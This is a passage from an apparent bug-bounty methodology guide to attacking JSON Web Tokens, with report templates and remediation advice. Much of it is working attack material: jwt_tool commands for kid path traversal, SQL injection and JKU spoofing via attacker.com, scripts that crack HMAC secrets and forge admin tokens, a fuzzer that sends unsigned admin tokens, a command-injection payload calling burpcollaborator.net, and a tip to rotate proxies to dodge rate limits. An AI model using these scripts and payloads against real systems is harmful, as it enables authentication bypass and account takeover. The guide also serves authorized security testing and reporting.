python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Kid SQLi
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "xxx' UNION SELECT 'key';--" -S hs256 -p "key"

# JKU spoofing (requires setup)
# 1. Generate keys
# 2. Host jwks.json
# 3. Forge token
python3 jwt_tool.py <TOKEN> -X s -ju "https://attacker.com/jwks.json"
```

### Phase 5: Manual Testing (30 minutes)

```bash
# Test expiration
# Use token after 24 hours

# Test cross-service relay
# Use token from Service A on Service B

# Test audience confusion
# Modify aud claim and test

# Test race conditions
# Parallel requests with same JTI
```

### Phase 6: Reporting

#### **Report Format:**

#### JWT [Vulnerability Type] - [Severity]

##### Summary
Brief description of the vulnerability

##### Steps to Reproduce
1. Navigate to login page
2. Capture JWT token
3. Decode token
4. [Specific attack steps]
5. Observe [unauthorized access/privilege escalation]

##### Proof of Concept

##### Original Token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

##### Decoded Payload:

```json
{
  "user": "victim",
  "role": "user"
}
```

##### Malicious Token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

##### Modified Payload:

```json
{
  "user": "victim",
  "role": "admin"
}
```

##### Request:

```http
GET /admin/panel HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

##### Response:

```http
HTTP/1.1 200 OK
[Admin panel HTML]
```

##### Impact

- Complete authentication bypass
- Unauthorized access to admin functionality
- Ability to impersonate any user
- [Business impact specific to target]

##### Remediation

- Reject "none" algorithm tokens
- Implement proper signature validation
- Use strong, random secrets (32+ bytes)
- Validate all claims (exp, aud, iss)
- [Specific recommendations]

##### References

- https://portswigger.net/web-security/jwt
- RFC 7519

---

## Automation Scripts

### Script 1: JWT Quick Test (Bash)

```bash
#!/bin/bash
# jwt_quick_test.sh

TOKEN=$1
TARGET=$2

echo "[*] Testing JWT: $TOKEN"
echo "[*] Target: $TARGET"

# Test 1: None algorithm
echo "[+] Testing none algorithm..."
python3 jwt_tool.py $TOKEN -X a -t "$TARGET" -rh "Authorization: Bearer TOKEN"

# Test 2: Remove signature
echo "[+] Testing signature removal..."
NOSIG=$(echo $TOKEN | rev | cut -d'.' -f2- | rev)"."
curl -s -H "Authorization: Bearer $NOSIG" "$TARGET" | grep -q "admin" && echo "[!] VULN: No signature accepted!"

# Test 3: Decode and check for secrets
echo "[+] Checking for sensitive data..."
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
echo $PAYLOAD | base64 -d 2>/dev/null | jq '.'

# Test 4: Check expiration
echo "[+] Checking expiration..."
EXP=$(echo $PAYLOAD | base64 -d 2>/dev/null | jq -r '.exp')
NOW=$(date +%s)
if [ $EXP -lt $NOW ]; then
    echo "[!] Token is expired but might still work"
fi

echo "[*] Quick test complete"
```

### Script 2: Mass JWT Cracker (Python)

```python
#!/usr/bin/env python3
# jwt_mass_crack.py

import jwt
import sys
from concurrent.futures import ThreadPoolExecutor

def try_secret(token, secret):
    try:
        jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
        return secret
    except:
        return None

def crack_jwt(token, wordlist_file, threads=10):
    print(f"[*] Cracking JWT with {wordlist_file}")
    
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
        secrets = [line.strip() for line in f]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda s: try_secret(token, s), secrets)
        
        for result in results:
            if result:
                print(f"[+] SECRET FOUND: {result}")
                return result
    
    print("[-] Secret not found")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <JWT> <wordlist>")
        sys.exit(1)
    
    token = sys.argv[1]
    wordlist = sys.argv[2]
    
    secret = crack_jwt(token, wordlist)
    
    if secret:
        print("\n[+] Forging new token with cracked secret...")
        payload = jwt.decode(token, options={"verify_signature": False})
        payload['role'] = 'admin'
        new_token = jwt.encode(payload, secret, algorithm='HS256')
        print(f"[+] New token: {new_token}")
```

### Script 3: JWT Fuzzer (Python)

```python
#!/usr/bin/env python3
# jwt_fuzzer.py

import jwt
import requests
import json

def fuzz_jwt(original_token, target_url):
    """Fuzz JWT with various attacks"""
    
    # Decode original
    try:
        header = jwt.get_unverified_header(original_token)
        payload = jwt.decode(original_token, options={"verify_signature": False})
    except:
        print("[-] Invalid JWT")
        return
    
    print(f"[*] Original algorithm: {header.get('alg')}")
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
    
    tests = []
    
    # Test 1: None algorithm variations
    for alg_variant in ['none', 'None', 'NONE', 'nOnE']:
        token = jwt.encode(payload, '', algorithm=None)
        tests.append(('None Algorithm', token))
    
    # Test 2: Modify claims
    admin_payload = payload.copy()
    admin_payload['role'] = 'admin'
    admin_payload['admin'] = True
    admin_payload['is_admin'] = True
    token = jwt.encode(admin_payload, '', algorithm=None)
    tests.append(('Admin Claims + None', token))
    
    # Test 3: Remove signature
    parts = original_token.split('.')
    no_sig_token = f"{parts[0]}.{parts[1]}."
    tests.append(('No Signature', no_sig_token))
    
    # Test 4: Empty signature
    empty_sig_token = f"{parts[0]}.{parts[1]}."
    tests.append(('Empty Signature', empty_sig_token))
    
    # Send requests
    for test_name, test_token in tests:
        print(f"\n[*] Testing: {test_name}")
        headers = {'Authorization': f'Bearer {test_token}'}
        
        try:
            resp = requests.get(target_url, headers=headers, timeout=10)
            print(f"    Status: {resp.status_code}")
            
            if resp.status_code == 200:
                print(f"    [!] POTENTIAL VULN: {test_name}")
                print(f"    Token: {test_token[:50]}...")
        except Exception as e:
            print(f"    Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <JWT> <target_url>")
        sys.exit(1)
    
    fuzz_jwt(sys.argv[1], sys.argv[2])
```

---

## Common Pitfalls & Pro Tips

### ⚠️ Common Mistakes

1. **Not testing all algorithm variations**
    
    - Test: `none`, `None`, `NONE`, `nOnE`, etc.
2. **Forgetting the trailing dot**
    
    - `header.payload.` vs `header.payload`
    - Some servers require the dot
3. **Using wrong jwt library version**
    
    - For RS256→HS256: Use `pyjwt==0.4.3`
    - Newer versions prevent this attack
4. **Not URL-encoding tokens**
    
    - JWT in URL parameters must be URL-encoded
    - `+` becomes `%2B`, `/` becomes `%2F`
5. **Testing only in Burp Repeater**
    
    - Some protections trigger only on real browsers
    - Test in actual application flow

### 💡 Pro Tips

1. **Always test with actual user flow**
    
    - Login → Capture token → Logout → Replay token
    - Tests expiration and revocation
2. **Check multiple endpoints**
    
    - Admin panel might have different validation than API
    - Test: `/api/*`, `/admin/*`, `/user/*`
3. **Look for JWT in unexpected places**
    
    - Websocket messages
    - GraphQL requests
    - Hidden form fields
    - PDF metadata
    - SAML assertions
4. **Combine with other vulns**
    
    - XSS + JWT theft = Account takeover
    - CSRF + JWT fixation = Session fixation
    - SSRF + JKU = RCE
5. **Document everything**
    
    - Keep original tokens
    - Save all responses
    - Screenshot admin panels accessed
    - Makes reporting easier
6. **Check refresh token endpoints**
    
    - Often have weaker validation
    - May accept expired access tokens
7. **Test with different user roles**
    
    - Regular user token
    - Admin token (if you can create)
    - Guest token
    - Expired token
8. **Monitor for rate limiting**
    
    - Brute force attacks may get blocked
    - Use proxies/VPN rotation if needed
9. **Check server responses carefully**
    
    - 401 vs 403 vs 500 can reveal validation logic
    - Error messages may leak information
10. **Use Burp Collaborator for blind attacks**
    
    ```json
    {"kid": "key.crt; nslookup $(whoami).burpcollaborator.net"}
    {"jku": "https://burpcollaborator.net/jwks.json"}
    ```
    

---

## Bug Bounty Report Templates

### Template 1: Critical - None Algorithm

#### JWT Authentication Bypass via None Algorithm

**Severity:** Critical  
**CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

##### Description
The application accepts JWT tokens with algorithm set to "none", allowing complete authentication bypass by removing the signature.

##### Impact
- Complete authentication bypass
- Ability to impersonate any user including administrators
- Unauthorized access to sensitive functionality
- Data breach potential

##### Steps to Reproduce
1. Login with valid credentials
2. Intercept the JWT token from Authorization header
3. Decode the JWT at jwt.io
4. Change `"alg":"HS256"` to `"alg":"none"` in header
5. Modify payload to set `"role":"admin"`
6. Remove signature (everything after second dot)
7. Send modified token in request to `/admin/users`
8. Observe admin panel access without valid credentials

##### Proof of Concept

**Original Token:**
```

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

```

**Malicious Token:**
```

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiJ9.

```

**Request:**
```http
GET /admin/users HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiJ9.
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"users":[{"id":1,"email":"admin@target.com","role":"admin"},...]}
```

##### Remediation

1. Explicitly reject tokens with `alg: none` in production
2. Use allow-list of accepted algorithms
3. Always verify signature before trusting payload
4. Update JWT library to latest version
5. Implement proper algorithm validation:

```python
# Good
jwt.decode(token, secret, algorithms=['HS256', 'RS256'])

# Bad
jwt.decode(token, secret, algorithms=header['alg'])
```

##### References

- CVE-2015-9235
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/


### Template 2: Critical - Weak Secret

#### JWT Weak HMAC Secret Leads to Account Takeover

**Severity:** Critical  
**CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

##### Description
The JWT HMAC secret key is weak and can be cracked using dictionary attack, allowing attacker to forge arbitrary tokens and takeover any user account.

##### Impact
- Full authentication bypass
- Mass account takeover capability
- Privilege escalation to administrator
- Complete compromise of user data

##### Steps to Reproduce
1. Capture any valid JWT token from the application
2. Run hashcat dictionary attack:
```bash
   hashcat -a 0 -m 16500 token.txt rockyou.txt
```

3. Secret cracked in < 1 minute: `password123`
4. Forge admin token with cracked secret
5. Access admin functionality

##### Proof of Concept

**Cracked Secret:** `password123`

**Forged Admin Token:**

```python
import jwt
payload = {'user_id': 1, 'email': 'admin@target.com', 'role': 'admin'}
token = jwt.encode(payload, 'password123', algorithm='HS256')
# Result: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Video:** [Link to PoC video showing account takeover]

**Hashcat Output:**

```nginx
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT)
Time.Started.....: Mon Oct  7 14:23:11 2025
Time.Estimated...: Mon Oct  7 14:23:42 2025 (31 secs)
```

##### Business Impact

With this vulnerability, an attacker can:

1. Enumerate all user IDs
2. Generate valid tokens for each user
3. Access accounts at scale
4. Modify user data, financial information
5. Steal PII of all customers

##### Remediation

**Immediate:**

1. Generate new cryptographically random secret (32+ bytes)
2. Invalidate all existing tokens (force re-authentication)
3. Rotate secret regularly (every 90 days)

**Long-term:**

1. Use asymmetric algorithms (RS256) instead of HS256
2. Implement secret rotation mechanism
3. Store secrets in secure vault (AWS Secrets Manager, HashiCorp Vault)
4. Monitor for unusual token usage patterns

**Secure Secret Generation:**

```python
import secrets
jwt_secret = secrets.token_urlsafe(32)  # 256 bits
```

##### References

- OWASP Authentication Cheat Sheet
- https://jwt.io/introduction

---

## Final Checklist

Before submitting report, verify:

- [ ] Tested all variations (none, None, NONE, nOnE)
- [ ] Attempted algorithm confusion with extracted public key
- [ ] Ran dictionary attack for at least 10 minutes
- [ ] Tested all header parameter injections (kid, jku, x5u, jwk, x5c)
- [ ] Verified token expiration is checked
- [ ] Tested token reuse after logout
- [ ] Attempted signature removal
- [ ] Checked for sensitive data in payload
- [ ] Tested multiple endpoints with modified token
- [ ] Documented all requests/responses
- [ ] Created video PoC for critical findings
- [ ] Calculated business impact
- [ ] Provided clear remediation steps
- [ ] Verified vulnerability is still present before submission
- [ ] Checked for duplicates in program

---

## **Key Takeaways:**

1. Always start with automated scanning (jwt_tool -M at)
2. Test for "none" algorithm first (quick win)
3. Extract public keys and test algorithm confusion
4. Attempt secret cracking on all HS256 tokens
5. Thoroughly test all header parameters
6. Document everything for reporting